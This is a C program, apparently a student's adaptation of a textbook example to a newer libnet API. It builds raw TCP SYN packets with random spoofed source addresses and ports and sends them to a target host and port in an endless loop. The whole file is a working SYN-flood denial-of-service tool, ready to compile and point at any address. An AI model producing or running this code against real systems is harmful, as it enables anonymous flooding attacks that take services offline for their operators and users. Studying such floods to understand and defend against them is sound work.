#include <libnet.h>

// return the string version of the passed-in IP address
char *print_ip(u_long *ip_addr_ptr)
{
    return inet_ntoa(*((struct in_addr *)ip_addr_ptr));
}

// args should be target IP and target port #
int main(int argc, char *argv[])
{
    libnet_t * context;
    u_long dest_ip; // this is the IP we're targeting
    u_short dest_port; // this is the port we're targeting
    u_char errorBuffer[LIBNET_ERRBUF_SIZE]; // default error buffer we need for all things
    int network; // used for the network interface
    int byte_count;
    int packet_size = LIBNET_IPV4_H + LIBNET_TCP_H;

    // check to make sure the program inputs match requirements
    if (argc < 3)
    {
        printf("Usage:\n%s\t <target host> <target port>\n", argv[0]);
        exit(1);
    }

    /*
        New version of libnet doesn't seem to have the same functs as the book, so I'm kinda trying to
        figure it out on my own.
    */
    context = libnet_init(LIBNET_RAW4, NULL, errorBuffer); //new version of libnet doesn't seem to have the same functs as the book
    if (context == NULL)
    {
        printf("Error opening context: %s", errorBuffer);
        exit(1);
    }

    dest_ip = libnet_name2addr4(context, argv[1], LIBNET_RESOLVE); // convert IP to network byte ordering
    dest_port = (u_short) atoi(argv[2]); // convert port to integer

    // seed randomizer
    libnet_seed_prand(context);

    printf("SYN Flooding port %d of %s..\n", dest_port, print_ip(&dest_ip));
    while(1)
    {
        // Start by building the TCP packet
        if (libnet_build_tcp(
            libnet_get_prand(LIBNET_PRu16), // Source TCP port (random)
            dest_port,                      // Destination port
            libnet_get_prand(LIBNET_PRu32), // Sequence number (random)
            libnet_get_prand(LIBNET_PRu32), // Acknowledgement number
            TH_SYN,                         // Control flag (SYN set only)
            libnet_get_prand(LIBNET_PRu16), // Window size
            0,                              // Checksum is set to autofill
            0,                              // Urgent pointer (not being used)
            LIBNET_TCP_H,                   // Size of the TCP header
            NULL,                           // Payload
            0,                              // Payload size
            context,                        // libnet context
            0                               // ptag value (0 for new header)
        ) == -1)
        {
            printf("Error building TCP packet: %s", libnet_geterror(context));
            exit(1);
        }

        // build the IPv4 Packet
        if (libnet_build_ipv4(
            packet_size,                    // size of the packet w/o IP header
            IPTOS_LOWDELAY,                 // IP tos
            libnet_get_prand(LIBNET_PRu16), // IP ID (random)
            0,                              // frag and offset
            libnet_get_prand(LIBNET_PR8),   // TTL (random)
            IPPROTO_TCP,                    // Transport proto
            0,                              // checksum
            libnet_get_prand(LIBNET_PRu32), // Source IP
            dest_ip,                        // Destination IP
            NULL,                           // Payload (null)
            0,                              // Payload size (0)
            context,                        // libnet context
            0                               // Auto create IP header
        ) == -1)
        {
            printf("Error building IP packet: %s", libnet_geterror(context));
            exit(1);
        }
        
        // Write the packet
        byte_count = libnet_write(context);
        if (byte_count != -1)
        {
            printf("%d bytes written.\n", byte_count);
        }
        else
        {
            printf("Error writing packet: %s", libnet_geterror(context));
        }

        libnet_clear_packet(context);
    }

    libnet_destroy(context);
}